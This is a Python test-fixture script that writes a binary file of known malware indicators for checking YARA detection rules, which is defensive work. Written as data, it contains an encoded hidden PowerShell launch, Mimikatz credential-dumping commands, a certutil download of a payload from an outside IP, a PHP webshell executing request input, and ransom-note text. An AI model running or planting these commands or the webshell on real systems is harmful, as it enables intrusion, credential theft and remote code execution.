"""Generate a test evidence file containing known IOC patterns for YARA scanning.

Creates a binary file with embedded patterns that match the built-in YARA rules.
Used to prove that yara-python can find real IOCs in evidence files.
"""

from pathlib import Path

FIXTURES_DIR = Path(__file__).parent


def create_evidence_file():
    """Create evidence_iocs.bin with patterns matching built-in YARA rules."""
    content = bytearray()

    # Padding
    content += b"\x00" * 1024

    # Pattern 1: Suspicious PowerShell (matches Suspicious_PowerShell_Encoded)
    content += b"cmd.exe /c powershell -ep bypass -nop -w hidden -enc SQBFAHgA\r\n"
    content += b"\x00" * 512

    # Pattern 2: DLL in Temp path with rundll32 (matches Suspicious_DLL_Temp_Path)
    content += b"rundll32 loaded \\\\AppData\\\\Local\\\\Temp\\\\update.dll for execution\r\n"
    content += b"\x00" * 512

    # Pattern 3: C2 IP address (matches C2_IP_Indicator)
    content += b"TCP connection to 185.220.101.34 on port 8443 established\r\n"
    content += b"\x00" * 512

    # Pattern 4: Mimikatz strings (matches Mimikatz_Credential_Theft)
    content += b"Running: sekurlsa::logonpasswords\r\nRunning: privilege::debug\r\n"
    content += b"\x00" * 512

    # Pattern 5: PsExec lateral movement (matches Lateral_Movement_PsExec)
    # PSEXESVC + \\ADMIN$\ (escaped for YARA matching)
    content += b"PSEXESVC started -- \\\\ADMIN$\\ share access\r\n"
    content += b"\x00" * 512

    # Pattern 6: Data staging (matches Data_Staging_Archive)
    content += b"Executed: 7z.exe a -r \\\\Documents\\\\ archive.7z\r\n"
    content += b"\x00" * 512

    # Pattern 7: LOLBin certutil (matches LOLBin_Abuse_Pattern)
    content += b"certutil -urlcache -split -f https://185.220.101.34:8444/payload\r\n"
    content += b"\x00" * 512

    # Pattern 8: Cobalt Strike shellcode marker (matches Cobalt_Strike_Shellcode_Pattern)
    content += bytes([0xFC, 0x48, 0x83, 0xE4, 0xF0])
    content += b"\x00" * 512

    # Pattern 9: Ransomware note indicators (matches Ransomware_Note_Indicators)
    content += b"Your files have been encrypted with military-grade encryption.\r\n"
    content += b"Send 2.5 bitcoin to the following address to receive your private key.\r\n"
    content += b"Visit http://xxxxxxxx.onion/payment to decrypt your files.\r\n"
    content += b"\x00" * 512

    # Pattern 10: PHP webshell indicators (matches Webshell_PHP_Indicators)
    content += b"<?php if(isset($_REQUEST['cmd'])){echo system(base64_decode($_POST['payload']));} ?>\r\n"
    content += b"\x00" * 512

    filepath = FIXTURES_DIR / "evidence_iocs.bin"
    filepath.write_bytes(bytes(content))
    print(f"Created {filepath.name}: {len(content)} bytes")
    return filepath


if __name__ == "__main__":
    create_evidence_file()
